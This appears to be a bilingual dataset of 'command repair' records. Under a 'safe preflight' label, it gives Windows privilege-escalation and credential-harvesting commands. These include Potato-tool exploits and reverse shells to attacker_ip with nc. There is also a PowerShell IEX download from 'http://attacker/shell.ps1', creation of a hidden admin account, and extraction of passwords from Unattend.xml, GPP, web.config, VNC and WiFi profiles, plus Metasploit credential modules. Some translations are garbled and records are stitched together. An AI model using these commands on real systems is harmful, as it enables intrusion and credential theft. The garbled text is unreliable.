description.en: Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Potato-Tool Capability Preflight syntax; record authorization, rollback, and blue-team evidence during execution.

explanation.en: Explains the parameter segment used by this reviewed validation command.

patches.expectedCommand:
# SweetPotato - 集成多种Potato技术
SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami"

# 指定攻击方式
SweetPotato.exe -e EfsRpc -p cmd.exe -a "/c net user testadmin Test@123 /add"
patches.command:
SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami"
SweetPotato.exe -e EfsRpc -p cmd.exe -a "/c net user testadmin Test@123 /add"

title.zh: Potato 工具能力安全预检命令校正 4
title.en: Safe Potato-Tool Capability Preflight Command Repair 4

description.zh: 仅移除纯叙述或修正实验占位符，保留 Potato 工具能力安全预检 的可复现技术语法；执行时记录授权、回滚和蓝队证据。
description.en: Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Potato-Tool Capability Preflight syntax; record authorization, rollback, and blue-team evidence during execution.

explanation.zh: 指定使用EFS RPC攻击向量
explanation.en: Explains the parameter segment used by this reviewed validation command.

patches.expectedCommand:
# GodPotato - 适用于Windows Server 2012-2022所有版本
GodPotato.exe -cmd "cmd /c whoami"

# 执行反弹Shell
GodPotato.exe -cmd "cmd /c C:\temp\nc.exe -e cmd.exe attacker_ip 4444"

# 添加管理员
GodPotato.exe -cmd "net user testadmin Test@123 /add && net localgroup administrators testadmin /add"

# 执行PowerShell
GodPotato.exe -cmd "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
patches.command:
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c C:\temp\nc.exe -e cmd.exe attacker_ip 4444"
GodPotato.exe -cmd "net user testadmin Test@123 /add && net localgroup administrators testadmin /add"
GodPotato.exe -cmd "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"

title.zh: Potato 工具能力安全预检命令校正 5
title.en: Safe Potato-Tool Capability Preflight Command Repair 5

description.zh: 仅移除纯叙述或修正实验占位符，保留 Potato 工具能力安全预检 的可复现技术语法；执行时记录授权、回滚和蓝队证据。
description.en: Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Potato-Tool Capability Preflight syntax; record authorization, rollback, and blue-team evidence during execution.

explanation.zh: 全版本兼容的Potato提权工具

patches.expectedCommand:
# 攻击机 - 启动socat重定向
socat tcp-listen:135,reuseaddr,fork tcp:target_ip:9999

# 目标机 - 执行RoguePotato
RoguePotato.exe -r attacker_ip -e "cmd /c whoami > C:\temp\proof.txt" -l 9999

# 或使用netcat反弹
RoguePotato.exe -r attacker_ip -e "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe" -l 9999
patches.command:
socat tcp-listen:135,reuseaddr,fork tcp:target_ip:9999
RoguePotato.exe -r attacker_ip -e "cmd /c whoami > C:\temp\proof.txt" -l 9999
RoguePotato.exe -r attacker_ip -e "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe" -l 9999

title.zh: Potato 工具能力安全预检命令校正 6
title.en: Safe Potato-Tool Capability Preflight Command Repair 6

description.zh: 仅移除纯叙述或修正实验占位符，保留 Potato 工具能力安全预检 的可复现技术语法；执行时记录授权、回滚和蓝队证据。
description.en: Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Potato-Tool Capability Preflight syntax; record authorization, rollback, and blue-team evidence during execution.

patches.expectedCommand:
# === 决策流程 ===
# 1. whoami /priv 确认SeImpersonatePrivilege
# 2. systeminfo 确认系统版本
#
# Windows Server 2012-2016 => JuicyPotato
# Windows Server 2019 (1809之前) => JuicyPotato (需正确CLSID)
# Windows 10/Server 2019+ => PrintSpoofer 或 GodPotato
# Windows Server 2022 => GodPotato
# 所有版本 => SweetPotato (自动选择)
# 需要远程中继 => RoguePotato
#
# 常用CLSID查询: https://ohpe.it/juicy-potato/CLSID/

title.en: Exchange Mailbox-Access Boundary Preflight Command Repair 1

title.zh: 无人值守凭证文件安全核对命令校正 2
title.en: Safe Unattended-Credential File Review Command Repair 2

description.zh: 仅移除纯叙述或修正实验占位符，保留 无人值守凭证文件安全核对 的可复现技术语法；执行时记录授权、回滚和蓝队证据。
description.en: Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Unattended-Credential File Review syntax; record authorization, rollback, and blue-team evidence during execution.

explanation.zh: 按通配符模式匹配文件名

patches.expectedCommand:
# 查看文件内容
type C:\Windows\Panther\Unattend.xml

# 关键字段搜索
findstr /i /c:"Password" /c:"AutoLogon" /c:"AdminPassword" C:\Windows\Panther\Unattend.xml

# PowerShell提取
[xml]$xml = Get-Content C:\Windows\Panther\Unattend.xml
$xml.unattend.settings.component | Where-Object { $_.AutoLogon } | ForEach-Object { $_.AutoLogon.Password.Value }
patches.command:
type C:\Windows\Panther\Unattend.xml
findstr /i /c:"Password" /c:"AutoLogon" /c:"AdminPassword" C:\Windows\Panther\Unattend.xml
[xml]$xml = Get-Content C:\Windows\Panther\Unattend.xml
$xml.unattend.settings.component | Where-Object { $_.AutoLogon } | ForEach-Object { $_.AutoLogon.Password.Value }

title.zh: 无人值守凭证文件安全核对命令校正 3
title.en: Safe Unattended-Credential File Review Command Repair 3

description.zh: 仅移除纯叙述或修正实验占位符，保留 无人值守凭证文件安全核对 的可复现技术语法；执行时记录授权、回滚和蓝队证据。
description.en: Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Unattended-Credential File Review syntax; record authorization, rollback, and blue-team evidence during execution.

explanation.zh: 不区分大小写搜索指定字符串
explanation.en: Explains the command segment used by this reviewed validation command.

explanation.zh: 自动登录配置(含明文密码)
将XML文件解析为PowerShell XML对象
explanation.en: will XML File Parse is PowerShell XML for Object

patches.expectedCommand:
# PowerShell解码Base64
$encoded = "QQBkAG0AaQBuAEAAMQAyADMA"  # 从XML提取的编码值
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))

# 或者使用certutil
echo QQBkAG0AaQBuAEAAMQAyADMA > C:\temp\encoded.txt
certutil -decode C:\temp\encoded.txt C:\temp\decoded.txt
type C:\temp\decoded.txt
patches.command:
$encoded = "QQBkAG0AaQBuAEAAMQAyADMA"
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
echo QQBkAG0AaQBuAEAAMQAyADMA > C:\temp\encoded.txt
certutil -decode C:\temp\encoded.txt C:\temp\decoded.txt
type C:\temp\decoded.txt

title.zh: 无人值守凭证文件安全核对命令校正 4
title.en: Safe Unattended-Credential File Review Command Repair 4

description.zh: 仅移除纯叙述或修正实验占位符，保留 无人值守凭证文件安全核对 的可复现技术语法；执行时记录授权、回滚和蓝队证据。
description.en: Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Unattended-Credential File Review syntax; record authorization, rollback, and blue-team evidence during execution.

explanation.en: Explains the command segment used by this reviewed validation command.

explanation.zh: 使用系统自带工具解码Base64
explanation.en: Decode Base64 Using Built-in System Tools

patches.expectedCommand:
# 检查GPP(Group Policy Preferences)密码
findstr /S /I cpassword \\domain.com\sysvol\domain.com\policies\*.xml 2>nul

# 检查IIS配置文件
type C:\inetpub\wwwroot\web.config 2>nul | findstr /i "connectionString password"

# 检查VNC密码文件
reg query "HKCU\Software\ORL\WinVNC3\Password" 2>nul
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password 2>nul

# 检查WiFi密码
netsh wlan show profiles
netsh wlan show profile name="目标WiFi" key=clear
patches.command:
findstr /S /I cpassword \\domain.com\sysvol\domain.com\policies\*.xml 2>nul
type C:\inetpub\wwwroot\web.config 2>nul | findstr /i "connectionString password"
reg query "HKCU\Software\ORL\WinVNC3\Password" 2>nul
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password 2>nul
netsh wlan show profiles
netsh wlan show profile name="{LAB_LABEL}WiFi" key=clear

patches.expectedCommand:
# Metasploit模块
use post/windows/gather/enum_unattend
set SESSION 1
run

# 也可以使用
use post/multi/gather/firefox_creds
use post/windows/gather/credentials/gpp
use post/windows/gather/cachedump
patches.command:
use post/windows/gather/enum_unattend
set SESSION 1
run
use post/multi/gather/firefox_creds
use post/windows/gather/credentials/gpp
use post/windows/gather/cachedump
